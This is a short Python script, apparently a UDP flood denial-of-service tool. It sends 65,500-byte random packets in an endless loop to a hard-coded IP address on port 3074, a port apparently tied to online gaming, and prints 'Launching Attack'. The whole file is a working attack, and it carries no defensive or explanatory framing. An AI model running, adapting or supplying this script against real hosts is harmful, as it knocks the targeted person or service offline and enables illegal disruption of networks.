import sys
import os
import time
import threading
import socket
import random

bytes = random._urandom(65500)

ip = '98.155.64.207'
port = 3074

sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
time.sleep(5)
print("Launching Attack")

while True:
	sock2.sendto(bytes, (ip,port))
	sock2.sendto(bytes, (ip,port))
	sock2.sendto(bytes, (ip,port))
	sock2.sendto(bytes, (ip,port))
	sock2.sendto(bytes, (ip,port))
